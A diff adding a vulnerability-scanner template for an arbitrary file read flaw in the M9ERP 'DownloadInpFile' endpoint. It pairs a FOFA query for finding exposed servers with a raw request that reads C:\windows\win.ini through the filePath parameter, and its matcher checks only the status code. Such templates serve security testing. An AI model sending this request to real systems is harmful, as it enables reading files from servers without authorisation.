@@ -1,0 +1,19 @@
+id: poc-gq4bsxfkvkw53kq9
+info:
+  name: 哲霖机械M9ERP DownloadInpFile 任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gq4bsxfkvkw53kq9'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gq4bsxfkvkw53kq9
+    fofa: body="Api/UserApi/GetUserName"
+http:
+- raw:
+  - GET /Basics/DownloadInpFile?filePath=C:\windows\win.ini HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
